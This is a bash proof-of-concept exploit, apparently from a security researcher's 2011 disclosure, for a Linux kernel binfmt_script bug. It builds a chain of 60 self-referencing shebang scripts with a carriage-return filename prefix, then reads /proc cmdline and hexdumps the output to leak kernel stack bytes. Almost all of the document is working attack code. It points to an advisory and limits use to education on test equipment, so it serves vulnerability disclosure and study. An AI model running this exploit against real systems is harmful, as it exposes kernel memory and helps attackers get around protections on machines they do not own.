#!/bin/bash
# This software is provided by the copyright owner "as is" and any
# expressed or implied warranties, including, but not limited to,
# the implied warranties of merchantability and fitness for a particular
# purpose are disclaimed. In no event shall the copyright owner be
# liable for any direct, indirect, incidential, special, exemplary or
# consequential damages, including, but not limited to, procurement
# of substitute goods or services, loss of use, data or profits or
# business interruption, however caused and on any theory of liability,
# whether in contract, strict liability, or tort, including negligence
# or otherwise, arising in any way out of the use of this software,
# even if advised of the possibility of such damage.
#
# Copyright (c) 2011 halfdog <me (%) halfdog.net>
#
# Description: This program creates a series of scripts calling
# each other leading to exposure of kernel stack bytes and higher
# CPU consumption.
#
# Usage: Use only for educational purposes on testing equipment. When
# run in empty directory, script will produce file "output" containing
# parts of stack depending on length of "filePrefix" variable content.
#
# See http://www.halfdog.net/Security/2012/LinuxKernelBinfmtScriptStackDataDisclosure/
# for details.

fileNum=0
filePrefix=$'\r'"file-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

while [ "${fileNum}" != 60 ]; do
  lastNum="${fileNum}"
  lastName="${filePrefix}-${lastNum}"
# Traverse 1-60
  let fileNum=fileNum+1
  fileName="${filePrefix}-${fileNum}"
# create files file-AAAxxx-N with below input
  cat <<EOF > "${lastName}"
#!${fileName} xxx
echo "Not reached"
EOF
  chmod 0755 -- "${lastName}"
done

# 60 files already created here. But, the 61st is the boom
echo $fileName
cat <<EOF > "${fileName}"
#!/bin/bash
echo "Args"
# get the input command-line with the current process
cat /proc/\$\$/cmdline
EOF
chmod 0755 -- "${fileName}"

# xxd: ascii/hexdump
"./${filePrefix}-0" | tee output | xxd
rm -- *file-*
